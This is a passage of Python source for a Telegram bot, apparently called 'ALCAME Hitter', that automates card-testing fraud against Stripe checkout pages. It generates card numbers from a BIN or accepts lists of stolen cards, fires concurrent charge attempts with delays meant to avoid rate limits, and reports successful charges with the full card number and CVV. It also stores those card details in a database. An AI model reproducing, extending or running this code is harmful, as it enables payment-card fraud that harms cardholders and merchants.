                await query.edit_message_text(f"✅ Auto Learn {'enabled' if new_value else 'disabled'}!")
            except Exception as e:
                await query.edit_message_text(f"Error: {e}")
            finally:
                conn.close()
        
        elif data == "settings_reset":
            conn = sqlite3.connect(DATABASE)
            c = conn.cursor()
            try:
                c.execute("DELETE FROM hits WHERE user_id=?", (user_id,))
                conn.commit()
                await query.edit_message_text("✅ Statistics reset successfully!")
            except Exception as e:
                await query.edit_message_text(f"Error: {e}")
            finally:
                conn.close()
        
        elif data == "settings_clear_patterns":
            conn = sqlite3.connect(DATABASE)
            c = conn.cursor()
            try:
                c.execute("DELETE FROM patterns")
                conn.commit()
                self.pattern_learner.patterns.clear()
                await query.edit_message_text("✅ Patterns cleared successfully!")
            except Exception as e:
                await query.edit_message_text(f"Error: {e}")
            finally:
                conn.close()
        
        elif data == "settings_back":
            await self.settings_command(update, context)
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Cancel the current operation."""
        await update.message.reply_text("❌ Operation cancelled.")
        return ConversationHandler.END
    
    async def hit_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start the hitting conversation."""
        await update.message.reply_text("🔗 Please enter the Stripe checkout URL:")
        return WAITING_URL
    
    async def hit_url_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process the URL."""
        url = update.message.text.strip()
        context.user_data['url'] = url
        
        await update.message.reply_text("🔍 Analyzing URL...")
        
        url_info = URLAnalyzer.analyze_url(url)
        context.user_data['url_info'] = url_info
        
        if url_info['success']:
            info_text = f"""
📋 **URL Analysis Results**

🏢 Merchant: {url_info['merchant']}
📦 Product: {url_info.get('product', 'Unknown')}
💰 Amount: {url_info.get('amount', 'Unknown')}
✅ Status: URL analyzed successfully
            """
            await update.message.reply_text(info_text, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("⚠️ Could not analyze URL fully, but will proceed.")
        
        # Ask for card source
        keyboard = [
            [InlineKeyboardButton("🎴 Generate from BIN", callback_data="card_generate")],
            [InlineKeyboardButton("📝 Enter manually", callback_data="card_manual")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Select card source:", reply_markup=reply_markup)
        return WAITING_CARD_SOURCE
    
    async def card_source_selected(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle card source selection."""
        query = update.callback_query
        await query.answer()
        
        if query.data == "card_generate":
            await query.edit_message_text("🔢 Enter BIN (format: 424242 or 424242|12|26|123):")
            context.user_data['card_source'] = 'generate'
            return WAITING_BIN
        else:
            await query.edit_message_text("💳 Enter cards (one per line, format: CC|MM|YY|CVV)\nEmpty line to finish:")
            context.user_data['card_source'] = 'manual'
            context.user_data['manual_cards'] = []
            return WAITING_MANUAL_CARDS
    
    async def bin_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process BIN input."""
        bin_input = update.message.text.strip()
        context.user_data['bin'] = bin_input
        
        await update.message.reply_text("How many cards to generate? (1-100):")
        return WAITING_CARD_COUNT
    
    async def card_count_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process card count."""
        try:
            count = int(update.message.text.strip())
            if count < 1 or count > MAX_ATTEMPTS:
                raise ValueError
        except:
            await update.message.reply_text(f"Please enter a number between 1 and {MAX_ATTEMPTS}:")
            return WAITING_CARD_COUNT
        
        context.user_data['card_count'] = count
        
        await update.message.reply_text(f"⚙️ How many hit attempts? (1-{count}):")
        return WAITING_HIT_COUNT
    
    async def manual_cards_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process manual cards."""
        text = update.message.text.strip()
        
        if not text:
            # Empty line - finish input
            cards = context.user_data.get('manual_cards', [])
            if not cards:
                await update.message.reply_text("No cards entered. Please enter at least one card:")
                return WAITING_MANUAL_CARDS
            
            context.user_data['cards'] = cards
            await update.message.reply_text(f"✅ {len(cards)} cards loaded.\n\nHow many hit attempts? (1-{len(cards)}):")
            return WAITING_HIT_COUNT
        
        # Parse card line
        parts = text.split('|')
        if len(parts) == 4:
            card = {
                'card': parts[0].strip(),
                'month': parts[1].strip().zfill(2),
                'year': parts[2].strip().zfill(2),
                'cvv': parts[3].strip()
            }
            context.user_data['manual_cards'].append(card)
            await update.message.reply_text(f"Card {len(context.user_data['manual_cards'])} added. Enter next card or empty line to finish:")
        else:
            await update.message.reply_text("Invalid format! Use: CC|MM|YY|CVV")
        
        return WAITING_MANUAL_CARDS
    
    async def hit_count_received(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process hit count and start hitting."""
        try:
            hit_count = int(update.message.text.strip())
            if context.user_data.get('card_source') == 'generate':
                max_cards = context.user_data.get('card_count', 0)
            else:
                max_cards = len(context.user_data.get('cards', []))
            
            if hit_count < 1 or hit_count > max_cards:
                raise ValueError
        except:
            await update.message.reply_text(f"Please enter a number between 1 and {max_cards}:")
            return WAITING_HIT_COUNT
        
        # Prepare cards
        if context.user_data.get('card_source') == 'generate':
            bin_input = context.user_data.get('bin')
            card_count = context.user_data.get('card_count')
            cards = CardGenerator.generate_cards(bin_input, card_count)
        else:
            cards = context.user_data.get('cards', [])[:hit_count]
        
        url = context.user_data.get('url')
        url_info = context.user_data.get('url_info')
        
        # Get user settings
        user_id = update.effective_user.id
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        try:
            c.execute("SELECT max_concurrent, auto_learn FROM user_settings WHERE user_id=?", (user_id,))
            result = c.fetchone()
            max_concurrent = result[0] if result else MAX_CONCURRENT
            auto_learn = result[1] if result else 1
        finally:
            conn.close()
        
        await update.message.reply_text(f"""
🚀 **Starting Hitting Session**

📊 Configuration:
• URL: {url_info['merchant']}
• Cards: {len(cards)}
• Attempts: {hit_count}
• Concurrent: {max_concurrent}
• AI Learning: {'ON' if auto_learn else 'OFF'}

🔄 Processing... I'll update you with results!
        """, parse_mode=ParseMode.MARKDOWN)
        
        # Run hitting
        engine = HitterEngine(max_concurrent)
        results = []
        successes = 0
        fails = 0
        
        for i, card in enumerate(cards[:hit_count]):
            # Add delay between attempts
            if i > 0:
                last_result = 'declined'
                if results and results[-1].success:
                    last_result = 'success'
                delay = engine.rate_limiter.calculate_delay(last_result)
                await asyncio.sleep(delay)
            
            result = await engine.hit(url, card, url_info['merchant'], 
                                     url_info.get('product', 'Unknown'),
                                     url_info.get('amount', 'Unknown'), i+1)
            results.append(result)
            
            if result.success:
                successes += 1
                if auto_learn:
                    self.pattern_learner.learn(card, url_info['merchant'], True)
                
                # Send success message
                success_text = f"""
🎉 **SUCCESSFUL CHARGE!** 🎉

💳 Card: `{card['card']}|{card['month']}|{card['year']}|{card['cvv']}`
🏢 Merchant: {url_info['merchant']}
💰 Amount: {url_info.get('amount', 'Unknown')}
⏱️ Time: {result.response_time:.2f}s
🔗 Receipt: [View]({result.receipt_url})
                """
                await update.message.reply_text(success_text, parse_mode=ParseMode.MARKDOWN)
            else:
                fails += 1
                if auto_learn:
                    self.pattern_learner.learn(card, url_info['merchant'], False)
                
                # Send decline message (throttled)
                if i % 5 == 0 or fails <= 3:
                    decline_text = f"""
❌ Attempt #{i+1} Declined
💳 Card: `{card['card']}|{card['month']}|{card['year']}|{card['cvv']}`
📉 Reason: {result.decline_code or 'Unknown'}
⏱️ Time: {result.response_time:.2f}s
                    """
                    await update.message.reply_text(decline_text, parse_mode=ParseMode.MARKDOWN)
            
            # Send progress update every 10 attempts
            if (i + 1) % 10 == 0:
                progress_text = f"📊 Progress: {i+1}/{hit_count} | ✅ {successes} | ❌ {fails}"
                await update.message.reply_text(progress_text)
        
        # Final statistics
        success_rate = (successes / hit_count * 100) if hit_count > 0 else 0
        avg_response = sum(r.response_time for r in results) / len(results) if results else 0
        final_text = f"""
🎯 **Hitting Session Complete!**

📊 **Final Statistics:**
• Total Attempts: {hit_count}
• Successful: {successes}
• Failed: {fails}
• Success Rate: {success_rate:.1f}%
• Avg Response: {avg_response:.2f}s

🏢 Merchant: {url_info['merchant']}
💰 Amount: {url_info.get('amount', 'Unknown')}

💾 Results saved to database.
        """
        await update.message.reply_text(final_text, parse_mode=ParseMode.MARKDOWN)
        
        # Save to database
        conn = sqlite3.connect(DATABASE)
        c = conn.cursor()
        try:
            for result in results:
                c.execute("""INSERT INTO hits (timestamp, card, merchant, product, amount, success, decline_code, receipt_url, response_time, user_id) 
                            VALUES (?,?,?,?,?,?,?,?,?,?)""",
                          (datetime.now().isoformat(),
                           f"{result.card['card']}|{result.card['month']}|{result.card['year']}|{result.card['cvv']}",
                           url_info['merchant'],
                           url_info.get('product', 'Unknown'),
                           url_info.get('amount', 'Unknown'),
                           1 if result.success else 0,
                           result.decline_code or '',
                           result.receipt_url or '',
                           result.response_time,
                           user_id))
            conn.commit()
        except Exception as e:
            logger.error(f"Error saving to database: {e}")
        finally:
            conn.close()
        
        return ConversationHandler.END
    
    def run(self):
        """Start the bot."""
        print("🚀 Starting ALCAME Hitter Telegram Bot...")
        print(f"📊 Database: {DATABASE}")
        print(f"🤖 Bot Token: {self.token[:10]}...")
        print("✅ Bot is running! Press Ctrl+C to stop.\n")
        init_db()
        self.application.run_polling(allowed_updates=Update.ALL_TYPES)

def main():
    """Main entry point."""
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Please set your bot token in the TOKEN variable!")
        sys.exit(1)
    
    bot = ANKITHitterBot(TOKEN)
    bot.run()

if __name__ == "__main__":
    main()
